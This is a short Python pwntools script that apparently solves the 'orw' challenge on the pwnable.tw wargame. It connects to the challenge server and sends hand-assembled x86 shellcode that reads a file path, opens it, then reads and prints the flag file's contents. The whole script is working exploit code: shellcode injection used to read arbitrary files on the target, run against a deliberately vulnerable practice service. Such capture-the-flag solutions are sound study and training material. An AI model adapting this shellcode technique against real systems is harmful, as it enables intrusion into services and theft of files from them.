from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
debug = 0

if debug:
    p = process("./orw") 
    gdb.attach(proc.pidof(p)[0]) 
else:
    p = remote("chall.pwnable.tw", 10001)

p.recvuntil("Give my your shellcode:")
asm_init = "xor eax, eax;xor ebx, ebx;xor ecx, ecx;xor edx,edx"
asm_write = "mov edx, 50;mov ebx, 1; mov ecx, {}; mov eax, 4; int 0x80;"
asm_read = "mov ecx, {};mov ebx, {}; mov edx, 50;mov eax, 3;int 0x80;"
asm_open = "mov ebx, {};mov ecx, 0; xor edx,edx;mov eax, 5;int 0x80;"

payload = asm(asm_init) + asm(asm_write.format("0x80486a0")) + asm(asm_read.format("esp", "0")) + asm(asm_open.format("esp")) + asm(asm_read.format("esp", "eax")) + asm(asm_write.format("esp"))
p.send(payload)

p.recvuntil("Give")
p.send("/home/orw/flag" + p32(0x00) + "Lambdax")
p.interactive()